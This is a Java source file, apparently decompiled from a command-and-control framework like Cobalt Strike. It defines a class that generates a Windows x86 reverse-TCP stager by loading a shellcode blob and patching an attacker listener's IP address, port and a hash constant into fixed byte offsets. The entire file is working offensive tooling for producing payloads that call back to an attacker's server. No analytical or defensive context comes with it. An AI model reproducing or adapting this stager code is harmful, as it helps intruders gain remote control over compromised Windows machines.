package stagers;

import common.CommonUtils;
import common.Packer;
import common.ScListener;
import graph.Route;

public class ForeignReverseStagerX86 extends GenericStager {
    public ForeignReverseStagerX86(ScListener scListener) {
        super(scListener);
    }

    public String arch() {
        return "x86";
    }

    public String payload() {
        return "windows/foreign/reverse_tcp";
    }

    public byte[] generate() {
        String str = CommonUtils.bString(CommonUtils.readResource("resources/reverse.bin")) + getConfig().getWatermark();
        long l = Route.ipToLong(getListener().getStagerHost());
        Packer packer = new Packer();
        packer.addInt((int) l);
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), 197);
        packer = new Packer();
        packer.little();
        packer.addInt(1453503984);
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), 229);
        packer = new Packer();
        packer.addShort(getListener().getPort());
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), 204);
        return CommonUtils.toBytes(str);
    }
}
